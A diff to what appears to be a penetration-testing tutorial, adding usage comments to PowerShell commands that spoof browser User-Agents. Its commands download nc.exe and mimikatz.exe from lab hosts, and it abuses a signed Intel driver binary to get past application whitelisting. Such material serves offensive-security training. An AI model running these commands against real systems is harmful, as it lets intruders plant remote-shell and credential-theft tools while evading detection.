@@ -15,6 +15,7 @@ The previous section showed how defenders detect file transfers via User-Agent s
 ```powershell
 [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
 ```
+> Lists the built-in browser User-Agent strings PowerShell can spoof; no values to change.
 
 **Available options:**
 
@@ -32,6 +33,7 @@ The previous section showed how defenders detect file transfers via User-Agent s
 $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
+> Downloads a file while spoofing a Chrome User-Agent to blend with browser traffic; swap the URL, the browser (Chrome/Firefox/etc.), and the output path.
 
 **What the server sees now:**
 
@@ -56,6 +58,7 @@ The **Intel Graphics Driver for Windows 10** includes a binary that downloads co
 ```powershell
 GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
 ```
+> Abuses a signed Intel LOLBin to download a file past application whitelisting; swap the URL and destination path (binary must exist on target).
 
 **Why this works:**
 - ✅ It's a signed Intel binary — application whitelisting trusts it
